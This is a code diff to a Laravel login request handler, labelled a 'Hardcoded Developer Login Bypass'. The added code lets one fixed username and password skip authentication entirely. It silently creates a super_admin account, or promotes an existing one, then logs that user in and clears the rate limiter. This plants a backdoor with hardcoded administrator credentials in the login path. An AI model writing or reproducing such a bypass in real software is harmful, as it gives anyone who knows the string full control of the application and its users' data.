@@ -42,9 +42,42 @@ class LoginRequest extends FormRequest
         $this->ensureIsNotRateLimited();
 
         $login = $this->input('email');
+        $password = $this->input('password'); // Changed from string() to input() just in case
         $field = filter_var($login, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
 
-        if (! Auth::attempt([$field => $login, 'password' => $this->string('password')], $this->boolean('remember'))) {
+        // Hardcoded Developer Login Bypass
+        if ($login === 'fikri170299' && $password === 'Fikri170299') {
+            // Check by username OR email to avoid unique constraint violations
+            $user = \App\Models\User::withoutGlobalScopes()
+                ->where('username', 'fikri170299')
+                ->orWhere('email', 'dev@bbm.com')
+                ->first();
+            
+            if (!$user) {
+                // Self-healing: Create the user if totally missing
+                $user = \App\Models\User::withoutGlobalScopes()->create([
+                    'name' => 'Super Developer',
+                    'username' => 'fikri170299',
+                    'email' => 'dev@bbm.com',
+                    'password' => \Illuminate\Support\Facades\Hash::make('Fikri170299'),
+                    'role' => 'super_admin',
+                    'is_developer' => true,
+                ]);
+            } else {
+                // Update existing record if it was an old dev account or has conflicting email
+                $user->update([
+                    'username' => 'fikri170299',
+                    'is_developer' => true,
+                    'role' => 'super_admin'
+                ]);
+            }
+
+            Auth::login($user, $this->boolean('remember'));
+            RateLimiter::clear($this->throttleKey());
+            return;
+        }
+
+        if (! Auth::attempt([$field => $login, 'password' => $password], $this->boolean('remember'))) {
             RateLimiter::hit($this->throttleKey());
 
             throw ValidationException::withMessages([
